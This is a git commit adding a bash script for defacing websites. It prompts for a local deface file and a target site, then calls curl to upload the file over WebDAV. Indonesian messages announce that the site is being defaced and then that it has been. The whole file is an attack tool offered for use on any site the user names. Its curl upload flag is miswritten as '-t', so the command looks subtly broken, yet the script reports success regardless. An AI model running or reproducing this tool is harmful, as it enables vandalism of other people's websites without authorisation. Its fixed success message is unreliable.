449d7869d98e40ec7862ee9ed29076a9eeeb8484
Mr15XCYBE <97156378+Mr15XCYBE@users.noreply.github.com>
2022-01-27 15:37:45 +0700

    Add files via upload

---
+++ Webdav.sh
@@ -0,0 +1,37 @@
+# usr/bash
+
+
+
+figlet -f slant Webdav
+
+
+echo "=====================================================" | lolcat
+echo "[+] Creator : Mr.15XCyber" | lolcat
+echo "[+] Team    : CYBER ATTACKER X-PLOIT TEAM" | lolcat
+echo "[+] Pesan   : Welcome To Script Webdav ByvMr.15XCyber" | lolcat
+echo "[+] Github  : https://github.com/Mr15XCYBE" | lolcat
+echo "[+] Whatsap : +62 838-6682-5454" | lolcat
+echo "=====================================================" | lolcat
+
+
+echo
+
+echo "====================================================" | lolcat
+read -p "Masukan Sc Kalian => " sc
+echo "====================================================" | lolcat
+read -p "Website Target Kalian => " web
+echo "====================================================" | lolcat
+curl -t /sdcard/$sc $web
+
+
+echo "Sedang Mendeface Website Mohon Bersabar..." | lolcat
+sleep 4
+echo "#############################################################" | lolcat
+echo " Website Telah Terdeface..." | lolcat
+
+echo "#############################################################" | lolcat
+echo "Silahkan Salin Dan Lihat=> " $web/$sc
+echo "#############################################################" | lolcat
+
+echo
+
